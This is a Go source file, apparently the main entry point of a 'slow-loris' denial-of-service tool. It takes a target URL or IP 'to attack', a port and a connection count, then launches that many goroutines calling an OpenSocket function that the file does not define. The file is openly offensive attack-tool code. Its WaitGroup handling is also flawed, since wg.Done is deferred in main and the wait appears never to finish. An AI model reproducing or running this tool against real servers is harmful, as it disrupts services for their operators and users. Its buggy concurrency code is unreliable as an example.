package main

import (
	"fmt"
	"flag"
	"os"
	"sync"
)

func printUsage() {
	flag.Usage()
	fmt.Println("Example: slow-loris -u https://test.com -p 443 -c 500")
	os.Exit(1)
}

func main() {
	var defaultPort string = "80"
	var defaultConnections int = 100

	url := flag.String("u", "nil", "This is the url or IP to attack")
	port := flag.String("p", defaultPort, "This is the port that is attacked")
	connections := flag.Int("c", defaultConnections, "This is the number of concurrent connections")

	flag.Parse()

	if flag.NFlag() == 0 {
		printUsage()
	}

	if *url == "nil" {
		panic("URL is required")
	}

	fmt.Printf("Blasting %v on port %v with %v concurrent connections\n", *url, *port, *connections)
	var wg sync.WaitGroup
	for i := 0; i < *connections; i++ {
		wg.Add(1)
		go OpenSocket(*url, *port)
		defer wg.Done()
	}
	wg.Wait()
}